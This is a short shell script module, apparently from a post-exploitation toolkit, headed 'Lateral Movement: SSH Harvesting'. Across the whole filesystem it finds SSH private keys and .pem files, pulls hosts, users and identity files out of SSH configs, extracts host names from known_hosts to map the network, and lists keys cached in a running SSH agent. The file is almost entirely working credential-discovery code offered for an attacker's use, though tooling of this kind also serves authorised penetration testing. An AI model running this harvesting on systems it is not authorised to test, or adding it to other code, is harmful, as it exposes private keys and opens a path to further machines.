# SSH Key and Config Harvesting
# Usage: load lateral/ssh_harvest.sh

print_header "Lateral Movement: SSH Harvesting"

# 1. Look for SSH Keys
print_with_label "Searching for Private Keys..."
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "*.pem" 2>/dev/null | grep -v "Permission denied" | while read -r key; do
    echo "Found Key: $key"
    # Optional: Cat the key (noisy)
    # cat "$key"
done

# 2. Look for SSH Configs
print_with_label "Searching for SSH Configs..."
find / -name "ssh_config" -o -name "config" 2>/dev/null | grep ".ssh" | while read -r config; do
    echo "Found Config: $config"
    grep -E "Host |HostName|User|IdentityFile" "$config" | head -n 5
done

# 3. Look for Known Hosts (Map the network)
print_with_label "Analyzing known_hosts..."
find / -name "known_hosts" 2>/dev/null | while read -r kh; do
    echo "Found known_hosts: $kh"
    cat "$kh" | awk '{print $1}' | cut -d, -f1 | sort -u
done

# 4. Check for SSH Agent
if [ -n "$SSH_AUTH_SOCK" ]; then
    print_success "SSH Agent detected! Socket: $SSH_AUTH_SOCK"
    print_with_label "Cached Keys:"
    ssh-add -l 2>/dev/null
else
    print_warning "No SSH Agent detected."
fi
